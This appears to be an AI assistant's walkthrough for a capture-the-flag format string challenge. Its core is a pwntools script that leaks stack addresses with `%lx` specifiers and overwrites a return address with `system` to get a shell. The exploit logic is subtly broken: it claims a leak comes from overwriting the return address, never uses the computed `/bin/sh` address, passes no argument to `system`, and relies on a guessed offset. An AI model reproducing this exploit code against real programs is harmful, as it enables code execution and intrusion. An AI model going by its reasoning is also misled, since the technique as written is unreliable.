To solve this challenge using `pwntools`, we need to carefully analyze the provided decompiled code and identify potential vulnerabilities. The key function to focus on is `sub_400D2B`, which provides a menu with options to show account information, edit account information, and quit. The `sub_400B07` function seems to be a candidate for a format string vulnerability due to the way it uses `printf`.

Here are the steps to exploit this vulnerability:

1. **Identify the Format String Vulnerability**: The `sub_400B07` function calls `printf` with a user-controlled format string. This can be exploited to leak memory addresses or write arbitrary values.

2. **Leak a Memory Address**: Use the format string vulnerability to leak a memory address, such as the stack address or a libc address, to defeat ASLR (Address Space Layout Randomization).

3. **Overwrite a Function Pointer**: Use the format string vulnerability to overwrite a function pointer or return address to redirect execution to a shellcode or a system call like `system("/bin/sh")`.

Let's go through the steps in detail and write the corresponding `pwntools` script.

### Step-by-Step Exploitation

#### 1. Leak a Memory Address
We will use the format string vulnerability to leak a memory address. We can leak the stack address by overwriting the return address of `sub_400B07`.

#### 2. Overwrite a Function Pointer
Once we have a leaked address, we can calculate the base address of the binary or libc. Then, we can overwrite a function pointer or return address to redirect execution to `system("/bin/sh")`.

### `pwntools` Script

```python
from pwn import *

# Set up the process
binary = './fmt'
elf = ELF(binary)
p = process(binary)

# Function to interact with the menu
def menu(option):
    p.sendlineafter(b">", str(option).encode())

# Function to register an account
def register(username, password):
    p.sendlineafter(b"username(max lenth:20): ", username)
    p.sendlineafter(b"password(max lenth:20): ", password)

# Function to show account information
def show_info(format_string):
    menu(1)
    p.sendlineafter(b"format:", format_string)

# Function to edit account information
def edit_info(format_string):
    menu(2)
    p.sendlineafter(b"format:", format_string)

# Register an account
register(b"A" * 20, b"B" * 20)

# Leak a stack address
show_info(b"%lx %lx %lx %lx %lx %lx %lx %lx %lx %lx")
leaked_addresses = p.recvline().strip().split()
stack_leak = int(leaked_addresses[6], 16)  # Adjust index as needed
log.info(f"Leaked stack address: {hex(stack_leak)}")

# Calculate the offset to the return address
offset = 0x100  # Adjust this value based on the actual offset
return_address = stack_leak - offset

# Overwrite the return address with the address of system("/bin/sh")
system_addr = elf.symbols['system']
bin_sh_addr = next(elf.search(b'/bin/sh\x00'))

# Craft the payload to overwrite the return address
payload = fmtstr_payload(6, {return_address: system_addr}, write_size='short')
edit_info(payload)

# Trigger the overwritten return address
menu(1)

# Interact with the shell
p.interactive()
```

### Explanation

1. **Register an Account**: We register an account with a fixed username and password.
2. **Leak a Stack Address**: We use the format string vulnerability to leak a stack address. The exact index of the leaked address may need to be adjusted based on the actual output.
3. **Calculate the Offset**: We calculate the offset to the return address. This value may need to be adjusted based on the actual layout of the stack.
4. **Craft the Payload**: We craft a payload using `fmtstr_payload` to overwrite the return address with the address of `system("/bin/sh")`.
5. **Trigger the Overwritten Return Address**: We trigger the overwritten return address by selecting the "Show Account Information" option again.

### Notes

- The exact offset and indices may need to be adjusted based on the actual behavior of the binary.
- Ensure that the `fmtstr_payload` parameters are correctly set for your specific environment.
- You may need to adjust the script to handle different environments or additional security features if present.

This script should give you a good starting point for exploiting the format string vulnerability in the given binary.
